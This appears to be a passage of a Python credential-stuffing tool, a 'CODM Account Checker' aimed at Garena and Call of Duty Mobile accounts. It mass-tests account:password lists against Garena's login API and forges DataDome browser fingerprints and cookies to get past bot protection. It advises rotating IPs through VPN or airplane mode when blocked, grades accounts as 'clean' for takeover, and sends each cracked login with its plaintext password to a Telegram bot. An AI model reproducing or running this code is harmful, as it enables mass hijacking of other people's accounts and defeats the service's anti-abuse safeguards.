import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)
import os
import sys
import time
import random
import hashlib
import json
import logging
import urllib.parse
import signal
import re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from threading import Lock
from Crypto.Cipher import AES
import requests
import cloudscraper
import colorama
import threading
from colorama import Fore, Style, Back
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.box import Box, DOUBLE, ROUNDED
from rich.live import Live
from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn, SpinnerColumn
from rich.layout import Layout
from rich.columns import Columns
from rich.text import Text
from rich.progress import Progress

colorama.init(autoreset=True)

console = Console()

class Colors:
    LIGHTGREEN_EX = colorama.Fore.LIGHTGREEN_EX
    WHITE = colorama.Fore.WHITE
    BLUE = colorama.Fore.BLUE
    GREEN = colorama.Fore.GREEN
    RED = colorama.Fore.RED
    CYAN = colorama.Fore.CYAN
    LIGHTBLACK_EX = colorama.Fore.LIGHTBLACK_EX
    RESET = colorama.Style.RESET_ALL 

class ColoredFormatter(logging.Formatter):
    COLORS = {
        'DEBUG': colorama.Fore.BLUE,
        'INFO': colorama.Fore.GREEN,
        'WARNING': colorama.Fore.YELLOW,
        'ERROR': colorama.Fore.RED,
        'CRITICAL': colorama.Fore.RED + colorama.Back.WHITE,
        'ORANGE': '\033[38;5;214m',
        'PURPLE': '\033[95m',
        'CYAN': '\033[96m',
        'SUCCESS': '\033[92m',
        'FAIL': '\033[91m'
    }

    RESET = colorama.Style.RESET_ALL

    def format(self, record):
        levelname = record.levelname
        if levelname in self.COLORS:
            record.msg = f"{self.COLORS[levelname]}{record.msg}{self.RESET}"
        return super().format(record)

logger = logging.getLogger()
handler = logging.StreamHandler()
handler.setFormatter(ColoredFormatter())
logger.addHandler(handler)
logger.setLevel(logging.INFO)

logging.getLogger("urllib3").setLevel(logging.ERROR)
logging.getLogger("requests").setLevel(logging.ERROR)

class GracefulThreadPoolExecutor(ThreadPoolExecutor):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._shutdown = False
        
    def shutdown(self, wait=True, *, cancel_futures=False):
        self._shutdown = True
        super().shutdown(wait=wait, cancel_futures=cancel_futures)

class CookieManager:
    def __init__(self):
        self.banned_cookies = set()
        self.load_banned_cookies()
        
    def load_banned_cookies(self):
        if os.path.exists('banned_cookies.txt'):
            with open('banned_cookies.txt', 'r') as f:
                self.banned_cookies = set(line.strip() for line in f if line.strip())
    
    def is_banned(self, cookie):
        return cookie in self.banned_cookies
    
    def mark_banned(self, cookie):
        self.banned_cookies.add(cookie)
        with open('banned_cookies.txt', 'a') as f:
            f.write(cookie + '\n')
    
    def get_valid_cookies(self): 
        valid_cookies = []
        if os.path.exists('fresh_cookie.txt'):
            with open('fresh_cookie.txt', 'r') as f:
                valid_cookies = [c.strip() for c in f.read().splitlines() 
                               if c.strip() and not self.is_banned(c.strip())]
        random.shuffle(valid_cookies)
        return valid_cookies
    
    def save_cookie(self, datadome_value):
        formatted_cookie = f"datadome={datadome_value.strip()}" 
        if not self.is_banned(formatted_cookie):
            existing_cookies = set()
            if os.path.exists('fresh_cookie.txt'):
                with open('fresh_cookie.txt', 'r') as f:
                    existing_cookies = set(line.strip() for line in f if line.strip())
                    
            if formatted_cookie not in existing_cookies:
                with open('fresh_cookie.txt', 'a') as f:
                    f.write(formatted_cookie + '\n')
                return True
            return False 
        return False

class DataDomeManager:
    def __init__(self):
        self.current_datadome = None
        self.datadome_history = []
        self._403_attempts = 0
        
    def set_datadome(self, datadome_cookie):
        if datadome_cookie and datadome_cookie != self.current_datadome:
            self.current_datadome = datadome_cookie
            self.datadome_history.append(datadome_cookie)
            if len(self.datadome_history) > 10:
                self.datadome_history.pop(0)
            
    def get_datadome(self):
        return self.current_datadome
        
    def extract_datadome_from_session(self, session):
        try:
            cookies_dict = session.cookies.get_dict()
            datadome_cookie = cookies_dict.get('datadome')
            if datadome_cookie:
                self.set_datadome(datadome_cookie)
                return datadome_cookie
            return None
        except Exception as e:
            logger.warning(f"[WARNING] Error extracting datadome from session: {e}")
            return None
        
    def clear_session_datadome(self, session):
        try:
            if 'datadome' in session.cookies:
                del session.cookies['datadome']
        except Exception as e:
            logger.warning(f"[WARNING] Error clearing datadome cookies: {e}")
        
    def set_session_datadome(self, session, datadome_cookie=None):
        try:
            self.clear_session_datadome(session)
            cookie_to_use = datadome_cookie or self.current_datadome
            if cookie_to_use:
                session.cookies.set('datadome', cookie_to_use, domain='.garena.com')
                return True
            return False
        except Exception as e:
            logger.warning(f"[WARNING] Error setting datadome cookie: {e}")
            return False

    def get_current_ip(self):
        ip_services = [
            'https://api.ipify.org',
            'https://icanhazip.com',
            'https://ident.me',
            'https://checkip.amazonaws.com'
        ]
        
        for service in ip_services:
            try:
                response = requests.get(service, timeout=10)
                if response.status_code == 200:
                    ip = response.text.strip()
                    if ip and '.' in ip:  
                        return ip
            except Exception:
                continue
        
        logger.warning(f"[WARNING] Could not fetch IP from any service")
        return None

    def wait_for_ip_change(self, session, check_interval=5, max_wait_time=200):
        logger.info(f"[𝙄𝙉𝙁𝙊] Auto-detecting IP change...")
        
        original_ip = self.get_current_ip()
        if not original_ip:
            logger.warning(f"[WARNING] Could not determine current IP, waiting 60 seconds")
            time.sleep(10)
            return True
            
        logger.info(f"[𝙄𝙉𝙁𝙊] Current IP: {original_ip}")
        logger.info(f"[𝙄𝙉𝙁𝙊] Waiting for IP change (checking every {check_interval} seconds, max {max_wait_time//60} minutes)...")
        
        start_time = time.time()
        attempts = 0
        
        while time.time() - start_time < max_wait_time:
            attempts += 1
            current_ip = self.get_current_ip()
            
            if current_ip and current_ip != original_ip:
                logger.info(f"[SUCCESS] IP changed from {original_ip} to {current_ip}")
                logger.info(f"[𝙄𝙉𝙁𝙊] IP changed successfully after {attempts} checks!")
                return True
            else:
                if attempts % 5 == 0:  
                    logger.info(f"[𝙄𝙉𝙁𝙊] IP check {attempts}: Still {original_ip} -> Auto-retrying...")
                time.sleep(check_interval)
        
        logger.warning(f"[WARNING] IP did not change after {max_wait_time} seconds")
        return False

    def handle_403(self, session):
        self._403_attempts += 1
        
        if self._403_attempts >= 3:
            logger.error(f"[ERROR] IP blocked after 3 attempts.")
            logger.error(f"[𝙄𝙉𝙁𝙊] Network fix: WiFi -> Use VPN | Mobile Data -> Toggle Airplane Mode")
            logger.info(f"[𝙄𝙉𝙁𝙊] Auto-detecting IP change...")
            
            if self.wait_for_ip_change(session):
                logger.info(f"[SUCCESS] IP changed, fetching new DataDome cookie...")
                
                self._403_attempts = 0
                
                new_datadome = get_datadome_cookie(session)
                if new_datadome:
                    self.set_datadome(new_datadome)
                    logger.info(f"[SUCCESS] New DataDome cookie obtained")
                    return True
                else:
                    logger.error(f"[ERROR] Failed to fetch new DataDome after IP change")
                    return False
            else:
                logger.error(f"[ERROR] IP did not change, cannot continue")
                return False
        return False

class TelegramBot:
    def __init__(self, bot_token, chat_id):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.base_url = f"https://api.telegram.org/bot{bot_token}"
        
    def send_message(self, message):
        try:
            url = f"{self.base_url}/sendMessage"
            payload = {
                'chat_id': self.chat_id,
                'text': message,
                'parse_mode': 'HTML'
            }
            response = requests.post(url, data=payload, timeout=10)
            if response.status_code == 200:
                return True
            else:
                logger.error(f"[TELEGRAM] Failed to send message: {response.status_code}")
                return False
        except Exception as e:
            logger.error(f"[TELEGRAM] Error sending message: {e}")
            return False
    
    def send_hit(self, account, password, details, codm_info, shells_balance):
        try:
            # Format the hit message
            message = f"<b>🎯 NEW CODM HIT FOUND!</b>\n\n"
            message += f"<b>👤 Account:</b> <code>{account}:{password}</code>\n"
            
            if codm_info:
                message += f"<b>🎮 CODM Nickname:</b> {codm_info.get('codm_nickname', 'N/A')}\n"
                message += f"<b>⭐ Level:</b> {codm_info.get('codm_level', 'N/A')}\n"
                message += f"<b>🆔 UID:</b> <code>{codm_info.get('uid', 'N/A')}</code>\n"
                message += f"<b>🌍 Region:</b> {codm_info.get('region', 'N/A')}\n"
            
            message += f"<b>💰 Shells:</b> {shells_balance}\n"
            message += f"<b>📍 Country:</b> {details['personal']['country']}\n"
            
            if details['is_clean']:
                message += f"<b>✅ Status:</b> <b>CLEAN</b>\n"
            else:
                message += f"<b>❌ Status:</b> <b>NOT CLEAN</b>\n"
                if details['binds']:
                    message += f"<b>🔗 Binds:</b> {', '.join(details['binds'])}\n"
            
            # Add timestamp
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            message += f"\n<code>⏰ {timestamp}</code>\n"
            message += f"<code>📱 Config By: @MercyNot1</code>"
            
            return self.send_message(message)
        except Exception as e:
            logger.error(f"[TELEGRAM] Error formatting hit: {e}")
            return False
    
    def send_stats(self, total_accounts, checked, valid, invalid, clean, not_clean, time_taken):
        try:
            message = f"<b>📊 CHECKER COMPLETED!</b>\n\n"
            message += f"<b>📁 Total Accounts:</b> {total_accounts}\n"
            message += f"<b>✅ Checked:</b> {checked}\n"
            message += f"<b>🎯 CODM Valid:</b> {valid}\n"
            message += f"<b>❌ CODM Invalid:</b> {invalid}\n"
            message += f"<b>✨ CLEAN:</b> {clean}\n"
            message += f"<b>🔗 NOT CLEAN:</b> {not_clean}\n"
            message += f"<b>⏱️ Time Taken:</b> {time_taken}\n"
            message += f"\n<code>🎮 CODM Account Checker</code>\n"
            message += f"<code>⚙️ Config By: @MercyNot1</code>"
            
            return self.send_message(message)
        except Exception as e:
            logger.error(f"[TELEGRAM] Error sending stats: {e}")
            return False

class LiveStatsDisplay:
    def __init__(self, total_accounts):
        self.total_accounts = total_accounts
        self.checked = 0
        self.valid = 0
        self.invalid = 0
        self.has_codm = 0
        self.no_codm = 0
        self.not_clean_codm = 0
        self.clean_codm = 0
        self.start_time = time.time()
        self.lock = threading.Lock()
        
        # Create progress bar
        self.progress = Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TextColumn("•"),
            TextColumn("[cyan]{task.completed}/{task.total}"),
            TextColumn("•"),
            TimeRemainingColumn(),
            console=console
        )
        self.task_id = self.progress.add_task("[cyan]Checking Accounts...", total=total_accounts)
        
    def update(self, valid=False, has_codm=False, clean=False):
        with self.lock:
            self.checked += 1
            if valid:
                self.valid += 1
                if has_codm:
                    self.has_codm += 1
                    if clean:
                        self.clean_codm += 1
                    else:
                        self.not_clean_codm += 1
                else:
                    self.no_codm += 1
            else:
                self.invalid += 1
            self.progress.update(self.task_id, advance=1)
    
    def get_live_stats_box(self):
        """Create the LIVE STATS box with the requested format"""
        with self.lock:
            # Calculate progress bar
            percentage = (self.checked / self.total_accounts * 100) if self.total_accounts > 0 else 0
            filled_width = int(percentage / 2)  # 50 characters = 100%
            progress_bar = "█" * filled_width + "░" * (50 - filled_width)
            
            # Format time
            elapsed = time.time() - self.start_time
            time_str = self.format_time(elapsed)
            
            # Create the stats box
            stats_text = f"[bold cyan]{progress_bar}[/bold cyan]\n"
            stats_text += f"[bold cyan]{percentage:>3.0f}% • {self.checked}/{self.total_accounts} • {time_str}[/bold cyan]\n\n"
            stats_text += f"[bold white]Valid:[/bold white]    [green]{self.valid:>4}[/green]   "
            stats_text += f"[bold white]Invalid:[/bold white]   [red]{self.invalid:>4}[/red]\n"
            stats_text += f"[bold white]Has Codm:[/bold white]  [green]{self.has_codm:>4}[/green]   "
            stats_text += f"[bold white]No Codm:[/bold white]   [yellow]{self.no_codm:>4}[/yellow]\n"
            stats_text += f"[bold white]Not Clean Codm:[/bold white] [red]{self.not_clean_codm:>4}[/red]   "
            stats_text += f"[bold white]Clean Codm:[/bold white] [green]{self.clean_codm:>4}[/green]"
            
            return Panel(
                stats_text,
                title="[bold cyan]LIVE STATS[/bold cyan]",
                border_style="cyan",
                box=ROUNDED,
                padding=(1, 2)
            )
    
    def format_time(self, seconds):
        if seconds < 60:
            return f"{seconds:.0f}s"
        elif seconds < 3600:
            minutes = seconds // 60
            seconds = seconds % 60
            return f"{int(minutes):02d}:{int(seconds):02d}"
        else:
            hours = seconds // 3600
            minutes = (seconds % 3600) // 60
            seconds = seconds % 60
            return f"{int(hours):02d}:{int(minutes):02d}:{int(seconds):02d}"
    
    def get_final_stats(self):
        elapsed = time.time() - self.start_time
        return {
            'total': self.total_accounts,
            'checked': self.checked,
            'valid': self.valid,
            'invalid': self.invalid,
            'has_codm': self.has_codm,
            'no_codm': self.no_codm,
            'not_clean_codm': self.not_clean_codm,
            'clean_codm': self.clean_codm,
            'time_taken': self.format_time(elapsed)
        }

def encode(plaintext, key):
    key = bytes.fromhex(key)
    plaintext = bytes.fromhex(plaintext)
    cipher = AES.new(key, AES.MODE_ECB)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext.hex()[:32]

def get_passmd5(password):
    decoded_password = urllib.parse.unquote(password)
    return hashlib.md5(decoded_password.encode('utf-8')).hexdigest()

def hash_password(password, v1, v2):
    passmd5 = get_passmd5(password)
    inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
    outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
    return encode(passmd5, outer_hash)

def applyck(session, cookie_str):
    session.cookies.clear()
    cookie_dict = {}
    for item in cookie_str.split(";"):
        item = item.strip()
        if '=' in item:
            try:
                key, value = item.split("=", 1)
                key = key.strip()
                value = value.strip()
                if key and value:
                    cookie_dict[key] = value 
            except (ValueError, IndexError):
                logger.warning(f"[WARNING] Skipping invalid cookie component: {item}")
        else:
            logger.warning(f"[WARNING] Skipping malformed cookie (no '='): {item}")
    
    if cookie_dict:
        session.cookies.update(cookie_dict)
        logger.info(f"[SUCCESS] Applied {len(cookie_dict)} unique cookie keys to session.")
    else:
        logger.warning(f"[WARNING] No valid cookies found in the provided string")

def get_datadome_cookie(session):
    url = 'https://dd.garena.com/js/'
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com',
        'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
    }
    
    payload = {
        "jsData": json.dumps({"ttst": 76.70000004768372, "ifov": False, "hc": 4, "br_oh": 824, "br_ow": 1536, "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36", "wbd": False, "dp0": True, "tagpu": 5.738121195951787, "wdif": False, "wdifrm": False, "npmtm": False, "br_h": 738, "br_w": 260, "isf": False, "nddc": 1, "rs_h": 864, "rs_w": 1536, "rs_cd": 24, "phe": False, "nm": False, "jsf": False, "lg": "en-US", "pr": 1.25, "ars_h": 824, "ars_w": 1536, "tz": -480, "str_ss": True, "str_ls": True, "str_idb": True, "str_odb": False, "plgod": False, "plg": 5, "plgne": True, "plgre": True, "plgof": False, "plggt": False, "pltod": False, "hcovdr": False, "hcovdr2": False, "plovdr": False, "plovdr2": False, "ftsovdr": False, "ftsovdr2": False, "lb": False, "eva": 33, "lo": False, "ts_mtp": 0, "ts_tec": False, "ts_tsa": False, "vnd": "Google Inc.", "bid": "NA", "mmt": "application/pdf,text/pdf", "plu": "PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF", "hdn": False, "awe": False, "geb": False, "dat": False, "med": "defined", "aco": "probably", "acots": False, "acmp": "probably", "acmpts": True, "acw": "probably", "acwts": False, "acma": "maybe", "acmats": False, "acaa": "probably", "acaats": True, "ac3": "", "ac3ts": False, "acf": "probably", "acfts": False, "acmp4": "maybe", "acmp4ts": False, "acmp3": "probably", "acmp3ts": False, "acwm": "maybe", "acwmts": False, "ocpt": False, "vco": "", "vcots": False, "vch": "probably", "vchts": True, "vcw": "probably", "vcwts": True, "vc3": "maybe", "vc3ts": False, "vcmp": "", "vcmpts": False, "vcq": "maybe", "vcqts": False, "vc1": "probably", "vc1ts": True, "dvm": 8, "sqt": False, "so": "landscape-primary", "bda": False, "wdw": True, "prm": True, "tzp": True, "cvs": True, "usb": True, "cap": True, "tbf": False, "lgs": True, "tpd": True}),
        'eventCounters': '[]',
        'jsType': 'ch',
        'cid': 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
        'ddk': 'AE3F04AD3F0D3A462481A337485081',
        'Referer': 'https://account.garena.com/',
        'request': '/',
        'responsePage': 'origin',
        'ddv': '4.35.4'
    }

    data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())

    try:
        response = requests.post(url, headers=headers, data=data)
        response.raise_for_status()
        response_json = response.json()
        
        if response_json['status'] == 200 and 'cookie' in response_json:
            cookie_string = response_json['cookie']
            datadome = cookie_string.split(';')[0].split('=')[1]
            return datadome
        else:
            logger.error(f"DataDome cookie not found in response. Status code: {response_json['status']}")
            return None
    except requests.exceptions.RequestException as e:
        logger.error(f"Error getting DataDome cookie: {e}")
        return None

def prelogin(session, account, datadome_manager):
    url = 'https://sso.garena.com/api/prelogin'
    params = {
        'app_id': '10100',
        'account': account,
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }
    
    retries = 3
    for attempt in range(retries):
        try:
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            
            for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
                if cookie_name in current_cookies:
                    cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
            
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
            
            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br, zstd',
                'accept-language': 'en-US,en;q=0.9',
                'connection': 'keep-alive',
                'host': 'sso.garena.com',
                'referer': f'https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-SG&account={account}',
                'sec-ch-ua': '"Google Chrome";v="133", "Chromium";v="133", "Not=A?Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'
            }
            
            if cookie_header:
                headers['cookie'] = cookie_header
            
            logger.info(f"[PRELOGIN] Attempt {attempt + 1}/{retries} for {account}")
            
            response = session.get(url, headers=headers, params=params, timeout=30)
            
            new_cookies = {}
            
            if 'set-cookie' in response.headers:
                set_cookie_header = response.headers['set-cookie']
                
                for cookie_str in set_cookie_header.split(','):
                    if '=' in cookie_str:
                        try:
                            cookie_name = cookie_str.split('=')[0].strip()
                            cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                            if cookie_name and cookie_value:
                                new_cookies[cookie_name] = cookie_value
                        except Exception as e:
                            pass
            
            try:
                response_cookies = response.cookies.get_dict()
                for cookie_name, cookie_value in response_cookies.items():
                    if cookie_name not in new_cookies:
                        new_cookies[cookie_name] = cookie_value
            except Exception as e:
                pass
            
            for cookie_name, cookie_value in new_cookies.items():
                if cookie_name in ['datadome', 'apple_state_key', 'sso_key']:
                    session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
                    if cookie_name == 'datadome':
                        datadome_manager.set_datadome(cookie_value)
            
            new_datadome = new_cookies.get('datadome')
            
            if response.status_code == 403:
                logger.error(f"[ERROR] 403 Forbidden during prelogin for {account} (attempt {attempt + 1}/{retries})")
                
                if new_cookies and attempt < retries - 1:
                    logger.info(f"[RETRY] Got new cookies from 403, retrying...")
                    time.sleep(2)
                    continue
                
                if datadome_manager.handle_403(session):
                    return "IP_BLOCKED", None, None
                else:
                    logger.error(f"[ERROR] Cannot continue with {account} due to IP block")
                    return None, None, new_datadome
                
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return None, None, new_datadome
            
            response.raise_for_status()
            
            try:
                data = response.json()
            except json.JSONDecodeError:
                logger.error(f"[ERROR] Invalid JSON response from prelogin for {account}")
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return None, None, new_datadome
            
            if 'error' in data:
                logger.error(f"[ERROR] Prelogin error for {account}: {data['error']}")
                return None, None, new_datadome
                
            v1 = data.get('v1')
            v2 = data.get('v2')
            
            if not v1 or not v2:
                logger.error(f"[ERROR] Missing v1 or v2 in prelogin response for {account}")
                return None, None, new_datadome
                
            logger.info(f"[SUCCESS] Prelogin successful: {account}")
            
            return v1, v2, new_datadome
            
        except requests.exceptions.HTTPError as e:
            if hasattr(e, 'response') and e.response is not None:
                if e.response.status_code == 403:
                    logger.error(f"[ERROR] 403 Forbidden during prelogin for {account} (attempt {attempt + 1}/{retries})")
                    
                    new_cookies = {}
                    if 'set-cookie' in e.response.headers:
                        set_cookie_header = e.response.headers['set-cookie']
                        for cookie_str in set_cookie_header.split(','):
                            if '=' in cookie_str:
                                try:
                                    cookie_name = cookie_str.split('=')[0].strip()
                                    cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                                    if cookie_name and cookie_value:
                                        new_cookies[cookie_name] = cookie_value
                                        session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
                                        if cookie_name == 'datadome':
                                            datadome_manager.set_datadome(cookie_value)
                                except Exception as ex:
                                    pass
                    
                    if new_cookies and attempt < retries - 1:
                        logger.info(f"[RETRY] Retrying with new cookies from 403...")
                        time.sleep(2)
                        continue
                    
                    if datadome_manager.handle_403(session):
                        return "IP_BLOCKED", None, None
                    else:
                        logger.error(f"[ERROR] Cannot continue with {account} due to IP block")
                        return None, None, new_cookies.get('datadome')
                        
                    if attempt < retries - 1:
                        time.sleep(2)
                        continue
                    return None, None, new_cookies.get('datadome')
                else:
                    logger.error(f"[ERROR] HTTP error {e.response.status_code} fetching prelogin data for {account} (attempt {attempt + 1}/{retries}): {e}")
            else:
                logger.error(f"[ERROR] HTTP error fetching prelogin data for {account} (attempt {attempt + 1}/{retries}): {e}")
                
            if attempt < retries - 1:
                time.sleep(2)
                continue
        except Exception as e:
            logger.error(f"[ERROR] Error fetching prelogin data for {account} (attempt {attempt + 1}/{retries}): {e}")
            if attempt < retries - 1:
                time.sleep(2)
                
    return None, None, None

def login(session, account, password, v1, v2):
    hashed_password = hash_password(password, v1, v2)
    url = 'https://sso.garena.com/api/login'
    params = {
        'app_id': '10100',
        'account': account,
        'password': hashed_password,
        'redirect_uri': 'https://account.garena.com/',
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }
    
    current_cookies = session.cookies.get_dict()
    cookie_parts = []
    for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
        if cookie_name in current_cookies:
            cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
    cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
    
    headers = {
        'accept': 'application/json, text/plain, */*',
        'referer': 'https://account.garena.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
    }
    
    if cookie_header:
        headers['cookie'] = cookie_header
    
    retries = 3
    for attempt in range(retries):
        try:
            response = session.get(url, headers=headers, params=params, timeout=30)
            response.raise_for_status()
            
            login_cookies = {}
            
            if 'set-cookie' in response.headers:
                set_cookie_header = response.headers['set-cookie']
                for cookie_str in set_cookie_header.split(','):
                    if '=' in cookie_str:
                        try:
                            cookie_name = cookie_str.split('=')[0].strip()
                            cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                            if cookie_name and cookie_value:
                                login_cookies[cookie_name] = cookie_value
                        except Exception as e:
                            pass
            
            try:
                response_cookies = response.cookies.get_dict()
                for cookie_name, cookie_value in response_cookies.items():
                    if cookie_name not in login_cookies:
                        login_cookies[cookie_name] = cookie_value
            except Exception as e:
                pass
            
            for cookie_name, cookie_value in login_cookies.items():
                if cookie_name in ['sso_key', 'apple_state_key', 'datadome']:
                    session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
            
            try:
                data = response.json()
            except json.JSONDecodeError:
                logger.error(f"[ERROR] Invalid JSON response from login for {account}")
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return None
            
            sso_key = login_cookies.get('sso_key') or response.cookies.get('sso_key')
            
            if 'error' in data:
                error_msg = data['error']
                logger.error(f"[ERROR] Login failed for {account}: {error_msg}")
                
                if error_msg == 'ACCOUNT DOESNT EXIST':
                    logger.warning(f"[WARNING] Authentication error - likely invalid credentials for {account}")
                    return None
                elif 'captcha' in error_msg.lower():
                    logger.warning(f"[WARNING] Captcha required for {account}")
                    time.sleep(3)
                    continue
                    
            return sso_key
            
        except requests.RequestException as e:
            logger.error(f"[ERROR] Login request failed for {account} (attempt {attempt + 1}): {e}")
            if attempt < retries - 1:
                time.sleep(2)
                
    return None

def get_codm_access_token(session):
    try:
        random_id = str(int(time.time() * 1000))
        token_url = "https://auth.garena.com/oauth/token/grant"
        token_headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": "https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/"
        }
        token_data = "client_id=100082&response_type=token&redirect_uri=https%3A%2F%2Fauth.codm.garena.com%2Fauth%2Fauth%2Fcallback_n%3Fsite%3Dhttps%3A%2F%2Fapi-delete-request.codm.garena.co.id%2Foauth%2Fcallback%2F&format=json&id=" + random_id
        
        token_response = session.post(token_url, headers=token_headers, data=token_data)
        token_data = token_response.json()
        return token_data.get("access_token", "")
    except Exception as e:
        logger.error(f"[ERROR] Error getting CODM access token: {e}")
        return ""

def process_codm_callback(session, access_token):
    try:
        codm_callback_url = f"https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/&access_token={access_token}"
        callback_headers = {
            "authority": "auth.codm.garena.com",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "referer": "https://auth.garena.com/",
            "sec-ch-ua": "\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-site",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        callback_response = session.get(codm_callback_url, headers=callback_headers, allow_redirects=False)
        
        api_callback_url = f"https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token={access_token}"
        api_callback_headers = {
            "authority": "api-delete-request.codm.garena.co.id",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "referer": "https://auth.garena.com/",
            "sec-ch-ua": "\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "cross-site",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        api_callback_response = session.get(api_callback_url, headers=api_callback_headers, allow_redirects=False)
        location = api_callback_response.headers.get("Location", "")
        
        if "err=3" in location:
            return None, "no_codm"
        elif "token=" in location:
            token = location.split("token=")[-1].split('&')[0]
            return token, "success"
        else:
            return None, "unknown_error"
            
    except Exception as e:
        logger.error(f"[ERROR] Error processing CODM callback: {e}")
        return None, "error"

def get_codm_user_info(session, token):
    try:
        check_login_url = "https://api-delete-request.codm.garena.co.id/oauth/check_login/"
        check_headers = {
            "authority": "api-delete-request.codm.garena.co.id",
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-US,en;q=0.9",
            "accept-encoding": "gzip, deflate, br, zstd",
            "cache-control": "no-cache",
            "codm-delete-token": token,
            "origin": "https://delete-request.codm.garena.co.id",
            "pragma": "no-cache",
            "referer": "https://delete-request.codm.garena.co.id/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v=\"24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
